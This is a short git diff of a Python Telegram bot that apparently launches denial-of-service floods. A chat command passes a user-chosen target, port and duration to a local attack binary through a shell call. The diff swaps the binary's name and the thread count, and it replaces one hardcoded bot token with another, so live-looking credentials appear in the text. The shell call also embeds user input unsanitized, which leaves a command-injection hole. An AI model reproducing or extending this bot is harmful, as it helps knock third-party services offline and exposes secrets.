@@ -13,7 +13,7 @@ import logging
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton  # ✅ FIXED IMPORT ERROR
 
 # ✅ TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('7053228704:AAHd3RM3gxJWwxIdwRm_-RU4YQjw2U2WbYs')
+bot = telebot.TeleBot('7053228704:AAF6whw5eBZ8bspvKNYgV1pqsVoYealO6qY')
 
 # ✅ GROUP AND ADMIN DETAILS
 GROUP_ID = "-1002252633433"
@@ -394,7 +394,7 @@ def handle_attack(message):
 
     def attack_execution():
         try:
-            subprocess.run(f"./soul {target} {port} {time_duration} 2500", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"./ravi {target} {port} {time_duration} 2000", shell=True, check=True, timeout=time_duration)
         except subprocess.TimeoutExpired:
             bot.reply_to(message, "❌ ATTACK TIMEOUT! SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!")
         except subprocess.CalledProcessError:
